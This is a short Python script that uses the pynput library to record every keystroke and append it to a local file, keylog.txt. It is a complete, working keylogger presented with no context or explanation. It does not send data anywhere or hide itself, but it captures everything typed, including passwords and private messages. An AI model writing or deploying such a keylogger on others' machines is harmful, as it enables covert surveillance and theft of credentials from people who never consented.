from pynput import keyboard

def on_press(key):
    with open("keylog.txt", "a") as f:
        try:
            f.write(f"{key.char}\n")
        except AttributeError:
            f.write(f"{key}\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    